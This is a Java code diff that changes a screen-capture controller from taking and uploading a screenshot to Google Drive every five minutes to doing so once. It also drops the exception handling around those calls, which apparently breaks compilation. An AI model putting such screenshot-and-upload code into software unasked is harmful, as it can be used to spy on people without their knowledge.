@@ -16,16 +16,12 @@ public class ScreenCaptureController {
         ScreenCaptureService screenCaptureService = new ScreenCaptureService();
         
         new Thread(() -> {
-            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
+            //ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
 
-            scheduler.scheduleAtFixedRate(() -> {
-                try {
-                    String imagePath = screenCaptureService.capture();
-                    GoogleDriveService.getInstance().sendMedia(imagePath, GoogleDriveService.getInstance().getImagesFolderId());
-                } catch (IOException | GeneralSecurityException ex) {
-                    Logger.getLogger(ScreenCaptureController.class.getName()).log(Level.SEVERE, null, ex);
-                }
-            }, 0, 5, TimeUnit.MINUTES);
+            //scheduler.scheduleAtFixedRate(() -> {
+                String imagePath = screenCaptureService.capture();
+                GoogleDriveService.getInstance().sendMedia(imagePath, GoogleDriveService.getInstance().getImagesFolderId());
+            //}, 0, 5, TimeUnit.MINUTES);
         }).start();
     }
 }
